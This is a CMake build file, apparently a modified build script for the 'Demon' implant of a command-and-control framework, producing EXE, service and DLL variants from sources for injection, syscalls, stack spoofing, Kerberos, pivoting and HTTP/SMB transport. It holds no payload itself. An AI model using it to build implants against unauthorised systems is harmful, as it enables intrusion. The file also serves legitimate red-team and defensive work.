#
# Modified: 2026-07-04
# Author: aratan (https://github.com/aratan)
# Changes:
#   - Restructured into 3 targets (Demon.exe, DemonSvc.exe, DemonDll.dll)
#     with per-target entry-point flags.
#   - Added NASM ASM_NASM support for Syscall.x64.asm + Spoof.x64.asm.
#   - Removed -lmscoree -lmscorlib (not available as static libs;
#     mscoree.dll loaded at runtime).
#   - Removed global -Wl,-e,main (breaks DLL builds).
#   - Added -Wno-incompatible-pointer-types -fpermissive for MinGW 16.1.0.
#

cmake_minimum_required(VERSION 3.19)
project( Demon C )

# find NASM assembler (required for .asm sources)
find_program( NASM nasm REQUIRED )
message( STATUS "NASM found: ${NASM}" )

enable_language( ASM_NASM )
set( CMAKE_ASM_NASM_COMPILER ${NASM} )
set( CMAKE_ASM_NASM_FLAGS "-f win64" )
set( CMAKE_ASM_NASM_OBJECT_FORMAT win64 )

# ensure .asm extension maps to NASM, not GNU AS
set( CMAKE_ASM_NASM_SOURCE_FILE_EXTENSIONS asm )

set( PROJECT_NAME Demon )

# set compiler settings
set( CMAKE_C_STANDARD 11 )
set( CMAKE_C_COMPILER x86_64-w64-mingw32-gcc )
set( CMAKE_C_FLAGS "-Wl,--pic-executable -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -Wno-incompatible-pointer-types -fno-exceptions -fmerge-all-constants -static-libgcc -flto -fpermissive -Wl,-Bstatic " )

# adding demon sources
include_directories( include )

set( COMMON_SOURCE
        src/core/Command.c
        src/core/Win32.c
        src/core/MiniStd.c
        src/core/Token.c
        src/core/Package.c
        src/core/Obf.c
        src/core/Spoof.c
        src/core/Syscalls.c
        src/core/SysNative.c
        src/core/Command.c
        src/core/Transport.c
        src/core/TransportHttp.c
        src/core/TransportSmb.c
        src/core/Parser.c
        src/core/Pivot.c
        src/core/Jobs.c
        src/core/Download.c
        src/core/Dotnet.c
        src/core/Socket.c
        src/core/Kerberos.c
        src/core/Thread.c
        src/core/Memory.c
        src/core/Runtime.c
        src/core/HwBpEngine.c
        src/core/HwBpExceptions.c
        src/core/CoffeeLdr.c
        src/core/ObjectApi.c
)

set( INJECT_SOURCE
        src/inject/Inject.c
        src/inject/InjectUtil.c
)

set( CRYPT_SOURCE
        src/crypt/AesCrypt.c
)

set( ASM_SOURCE
        src/asm/Syscall.x64.asm
        src/asm/Spoof.x64.asm
)

set( MAIN_SOURCE
        # Demon Main entrypoint
        src/Demon.c

        # windows exe
        src/main/MainExe.c

        # windows dll
        src/main/MainDll.c

        # windows service
        src/main/MainSvc.c
)


# preprocessor flags
add_compile_definitions( DEBUG )

add_compile_definitions( CONFIG_BYTES={} )
add_compile_definitions( CONFIG_SIZE=1024 )
add_compile_definitions( CONFIG_KEY_BYTES={} )
add_compile_definitions( CONFIG_KEY_SIZE=16 )
add_compile_definitions( SERVICE_NAME="DemonService" )

add_compile_definitions( TRANSPORT_HTTP )
add_compile_definitions( TRANSPORT_SMB )
add_compile_definitions( AES256 )

# linking library (mscoree/mscorlib not available as static; loaded at runtime)
link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi )

# source files shared by all targets
set( DEMON_COMMON_SOURCES
    ${COMMON_SOURCE}
    ${INJECT_SOURCE}
    ${EXT_SOURCE}
    ${CRYPT_SOURCE}
    ${LOADER_SOURCE}
    ${ASM_SOURCE}
)

# demon executable (uses main entry point directly)
add_executable( ${PROJECT_NAME} ${DEMON_COMMON_SOURCES}
    src/Demon.c
    src/main/MainExe.c
)
target_link_options( ${PROJECT_NAME} PRIVATE "-Wl,-e,main" )

# demon service (uses main entry point directly)
add_executable( DemonSvc ${DEMON_COMMON_SOURCES}
    src/Demon.c
    src/main/MainSvc.c
)
target_link_options( DemonSvc PRIVATE "-Wl,-e,main" )

# demon DLL (uses DllMainCRTStartup — NO -e,main)
add_library( DemonDll SHARED ${DEMON_COMMON_SOURCES}
    src/Demon.c
    src/main/MainDll.c
)
set_target_properties( DemonDll PROPERTIES
    PREFIX ""
    OUTPUT_NAME "DemonDll"
    SUFFIX ".dll"
)
